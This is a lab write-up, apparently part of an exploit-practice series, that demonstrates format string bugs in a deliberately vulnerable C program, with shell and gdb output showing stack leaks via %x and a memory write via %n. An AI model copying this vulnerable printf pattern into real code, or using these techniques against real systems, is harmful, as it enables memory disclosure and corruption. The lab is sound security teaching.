### Info
In this lab, we'll try to exploit format string bugs<br/><br/>
**Environment**: Ubuntu 18.04.3 LTS, ASLR disabled<br>
**Keywords**: format string vulnerability

### Implementation
Format string vulnerabilities occur when a user controlled string is passed to the printf like functions (sprintf, snprintf ...)
as the format parameter.
Here is the minimum example code:
```
int main(int argc, char **argv)
{
    int var = 0xdeadcafe;
    printf(argv[1]);
}
```
#### Increment 1: Exposing data from stack
A valid printf of usage with format specifier is as the following:
```
printf("Integer value is %d\n" , my_int_var);
```
If you omit the second parameter `my_int_var`, printf dumps the content in the next word in stack. On the other hand, if you specify 
more specifiers than the number or arguments, again printf dumps data from stack.

Back to our example source code, before `call printf`, stack will look like below. The more specifier we pass to the program,
the more data we'll expose data from the stack.

``` 
+------------------------+
| address of format str  |
+------------------------+
| ..stack of main..      | 
+------------------------+
| deadcafe               | 
+------------------------+
| ..stack of main..      |
+------------------------+
| old ebp                |
+------------------------+
| ret addr               |
+------------------------+
higher address
```
We expose the data as the following. `;echo` is just added to have a new line after each output. By the way `;` is a seperator to
run multiple commands in one line.
```
uzi@pwnpatrol:$ ./fs '%x' ;echo
0
uzi@pwnpatrol:$ ./fs '%x,%x,%x' ;echo
0,ffffd600,80484bb
uzi@pwnpatrol:$ ./fs '%x,%x,%x,%x,%x,%x' ;echo
0,ffffd600,80484bb,2,ffffd5f4,ffffd600
uzi@pwnpatrol:$ ./fs '%x,%x,%x,%x,%x,%x,%x,%x,%x' ;echo
0,ffffd5f0,80484bb,2,ffffd5e4,ffffd5f0,deadcafe,f7fe59b0,ffffd550
``` 
As you see, we dumped several words in stack (some junk, some meaningful). Our local variable with value `0xdeadcafe` is somewhere around the middle of main function stack.
Format strings has two important features:
* We can specify the nth argument in format string directly. For example `0xdeadcafe` was the 7th word dumbed above. We can dump just it using `%<number>$specifier` syntax:
```
uzi@pwnpatrol:$ ./fs '%7$x'
deadcafe
```
PS: Notice that I used single qoutes around the argument. If you use double quotes, shell will try to expand $x.
* The more interesting feature is that using `n` specifier, the number of characters written so far is stored in the pointed location.
```
uzi@pwnpatrol:$ ./fs 'sample:%7$x' ;echo
sample:deadcafe
```
What will happen if I change the `x` to `n` in format string?
```
uzi@pwnpatrol:$ ./fs 'sample:%7$n' ;echo
Segmentation fault (core dumped)
```
To understand what happened, we can start the binary with gdb and run with 'sample:%7$n'
```
uzi@pwnpatrol:$ gdb -q fs
Reading symbols from fs...(no debugging symbols found)...done.
(gdb) r 'sample:%7$n'
Starting program: /home/uzi/exploit_labs/lab7_format_string/fs 'sample:%7$n'
Program received signal SIGSEGV, Segmentation fault.
0xf7e30745 in ?? () from /lib/i386-linux-gnu/libc.so.6
```
Let's check segfaulting instruction and its operands. As explained above, it tried to write the length(7) of "sample:" to the location
pointed by 7th argument. In this case, it's not a valid address of the process, and therefore program segfaulted.

```
(gdb) x/i $eip
=> 0xf7e30745:  mov    DWORD PTR [eax],esi
(gdb) i r eax esi
eax            0xdeadcafe       -559035650
esi            0x7      7
```

